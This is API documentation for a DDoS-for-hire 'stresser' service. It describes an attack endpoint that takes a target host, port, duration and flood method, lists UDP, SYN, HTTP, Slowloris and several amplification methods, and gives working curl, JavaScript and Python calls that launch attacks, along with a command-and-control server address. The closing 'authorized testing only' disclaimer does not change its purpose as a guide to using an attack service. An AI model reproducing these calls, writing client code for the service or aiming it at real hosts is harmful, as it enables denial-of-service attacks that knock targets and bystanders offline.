# ZOPZ STRESS API Documentation

## Overview

The ZOPZ STRESS API provides programmatic access to initiate DDoS attacks through a RESTful interface. All API requests must include authentication credentials.

**Base URL:** `https://zopzstress.st/api`

**C2 Server:** `proxy.zopzstress.st:10000`

---

## Authentication

Authentication is performed via query parameters in the API request:
- `username`: Your account username
- `password`: Your account password

**Note:** Credentials are passed as query parameters. For production use, consider implementing token-based authentication.

---

## Endpoints

### Initiate Attack

Initiates a DDoS attack against a specified target.

**Endpoint:** `GET /attack`

**URL:** `https://zopzstress.st/api/attack`

#### Query Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `username` | string | Yes | Your account username |
| `password` | string | Yes | Your account password |
| `host` | string | Yes | Target hostname or IP address |
| `port` | integer | Yes | Target port number |
| `time` | integer | Yes | Attack duration in seconds |
| `method` | string | Yes | Attack method to use (see available methods below) |
| `len` | integer | No | Optional length parameter (method-specific) |

#### Available Attack Methods

The following attack methods are available:
- `UDP` - UDP flood attack
- `TCP` - TCP flood attack
- `HTTP` - HTTP flood attack
- `SYN` - SYN flood attack
- `ICMP` - ICMP flood attack
- `Slowloris` - Slowloris attack
- `Memcached` - Memcached amplification attack
- `NTP` - NTP amplification attack
- `DNS` - DNS amplification attack

*Note: Available methods may vary based on your account permissions and server configuration.*

#### Request Example

```bash
curl "https://zopzstress.st/api/attack?username=randomguy&password=qwopmiw3&host=example.com&port=80&time=60&method=UDP"
```

```javascript
const axios = require('axios');

const params = {
  username: 'randomguy',
  password: 'qwopmiw3',
  host: 'example.com',
  port: 80,
  time: 60,
  method: 'UDP'
};

axios.get('https://zopzstress.st/api/attack', { params })
  .then(response => {
    console.log(response.data);
  })
  .catch(error => {
    console.error(error);
  });
```

```python
import requests

url = "https://zopzstress.st/api/attack"
params = {
    "username": "randomguy",
    "password": "qwopmiw3",
    "host": "example.com",
    "port": 80,
    "time": 60,
    "method": "UDP"
}

response = requests.get(url, params=params)
print(response.json())
```

#### Response Format

**Success Response (200 OK):**

```json
{
  "status": "success",
  "message": "Attack initiated successfully",
  "attack_id": "unique-attack-id",
  "target": "example.com",
  "port": 80,
  "method": "UDP",
  "duration": 60
}
```

**Error Response (400/401/500):**

```json
{
  "status": "error",
  "message": "Error description",
  "code": "ERROR_CODE"
}
```

#### Error Codes

| Code | Description |
|------|-------------|
| `INVALID_CREDENTIALS` | Username or password is incorrect |
| `INVALID_HOST` | Target host is invalid or not allowed |
| `INVALID_PORT` | Port number is out of valid range |
| `INVALID_TIME` | Attack duration exceeds maximum allowed time |
| `INVALID_METHOD` | Attack method is not available or not supported |
| `ACCOUNT_EXPIRED` | User account has expired |
| `NO_API_ACCESS` | Account does not have API access enabled |
| `RATE_LIMIT_EXCEEDED` | Too many requests in a short period |
| `SERVER_ERROR` | Internal server error |

---

## C2 Server Information

**C2 Server:** `proxy.zopzstress.st:10000`

The C2 (Command and Control) server is used for direct communication and attack coordination. This server operates on port 10000.

**Note:** Direct C2 server access may require additional authentication or connection protocols not documented in this REST API.

---

## Rate Limiting

API requests are subject to rate limiting to prevent abuse. Specific rate limits may vary based on your account tier and subscription level.

**Typical Limits:**
- Free tier: 10 requests per minute
- Premium tier: 100 requests per minute
- Enterprise tier: Unlimited

When rate limits are exceeded, the API will return a `429 Too Many Requests` status code.

---

## Best Practices

1. **Security:**
   - Never expose your credentials in client-side code
   - Use environment variables or secure credential storage
   - Consider implementing token-based authentication for production

2. **Error Handling:**
   - Always check response status codes
   - Implement retry logic with exponential backoff
   - Log errors for debugging purposes

3. **Performance:**
   - Cache authentication tokens when possible
   - Batch requests when initiating multiple attacks
   - Monitor your rate limit usage

4. **Compliance:**
   - Ensure you have authorization before attacking any target
   - Only use this service for legitimate security testing
   - Comply with all applicable laws and regulations

---

## Support

For API support, issues, or feature requests:
- Website: https://zopzstress.st
- Documentation: This file
- C2 Server: proxy.zopzstress.st:10000

---

## Changelog

### Version 1.0.0
- Initial API release
- Basic attack initiation endpoint
- Query parameter authentication

---

## Legal Disclaimer

This API is provided for authorized security testing and educational purposes only. Users are responsible for ensuring they have proper authorization before initiating any attacks. Unauthorized use of this service may violate local, state, and federal laws. The service provider is not responsible for misuse of this API.
